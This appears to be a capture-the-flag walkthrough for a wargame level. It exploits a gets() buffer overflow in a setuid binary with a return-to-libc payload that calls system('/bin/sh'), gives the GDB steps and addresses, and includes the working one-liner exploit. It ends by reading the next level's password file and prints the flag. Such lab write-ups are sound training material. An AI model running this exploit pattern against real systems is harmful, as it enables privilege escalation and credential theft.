# Level 2 Walkthrough

1. **Connect to the target machine**

	```bash
	ssh level2@<vm-ip> -p 4242
	```

2. **Check the files**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-s---+ 1 level3 users 5138 Mar  6  2016 level2
	```

3. **Test the binary**

	```bash
	./level2
	```

	It waits for input, echoes the input, and exits..


4. **Copy the binary locally for analysis**

	```bash
	scp -P 4242 level2@<vm-ip>:/home/user/level2/level2 .
	```

5. **Disassemble and inspect with Ghidra**
	The vulnerable function:

	```c
	void p() {
		char buffer[76];
		gets(buffer);			// vulnerable
		...
		strdup(buffer);			// return value used later
	}
	```

6. **Inspect in GDB step-by-step**

	Launch and break at `main`:

	```bash
	gdb level2
	(gdb) b main
	(gdb) run
	```

	Break inside vulnerable function `p()`:

	```gdb
	(gdb) b p
	(gdb) c
	```

	Set a breakpoint just after `strdup()`:

	```gdb
	(gdb) disas
	(gdb) b *0x0804853d
	(gdb) c
	```

	Input `/bin/sh` when prompted:

	```
	/bin/sh
	```

	Confirm `strdup()` returned `/bin/sh` string:

	```gdb
	(gdb) p (char*)$eax
	$3 = 0x0804a008 "/bin/sh"
	```

	This confirms the memory address to pass to `system()`.

	Also found:

	* `system()` address: `0xb7e6b060`
	* `exit()` address:	`0xb7e5ebe0`
	* Address after `strdup()`: `0x0804a008` (returns `/bin/sh`)

7. **Construct the payload**

	Total buffer size:

	* 76 bytes (buffer)
	* +4 bytes (saved EBP)
	* Total = 80 bytes before return address.

	Final payload structure:

	| Component     | Bytes | Purpose                                     |
	| ------------- | ----- | ------------------------------------------- |
	| `/bin/sh\x00` | 8     | String to be duplicated via `strdup()`      |
	| `"A" * 72`    | 72    | Fills buffer up to saved EBP                |
	| `0x0804853e`  | 4     | Return to instruction *after* `strdup()`    |
	| `0xb7e6b060`  | 4     | Address of `system()`                       |
	| `0xb7e5ebe0`  | 4     | Address of `exit()`                         |
	| `0x0804a008`  | 4     | Pointer to `/bin/sh` (return from `strdup`) |

8. **Execute the exploit**

	```bash
	(printf "/bin/sh\x00"; printf 'A%.0s' {1..72}; \
	printf '\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x08\xa0\x04\x08'; cat) | ./level2
	```

9. **Read the password**

	```bash
	whoami
	cat /home/user/level3/.pass
	```

	Output:

	```
	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
	```
